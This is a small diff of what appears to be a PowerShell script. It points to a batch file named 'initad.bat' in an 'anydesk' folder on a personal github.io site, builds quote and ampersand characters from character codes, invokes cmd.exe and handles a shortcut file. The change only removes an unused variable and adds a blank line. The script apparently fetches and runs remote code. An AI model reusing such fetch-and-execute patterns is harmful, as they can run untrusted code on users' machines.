@@ -54,7 +54,6 @@ try {
 
 $url = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
 $q   = [char]34
-$aa  = [char]38 + [char]38
 $a   = [char]38
 
 $cmd = '%SystemRoot%\System32\cmd.exe'
@@ -126,3 +125,4 @@ Remove-Item $progPath -Force -ErrorAction SilentlyContinue
 if (-not (Test-Path $lnkPath)) {
     Write-Warning "Can't find $lnkPath"
 }
+    
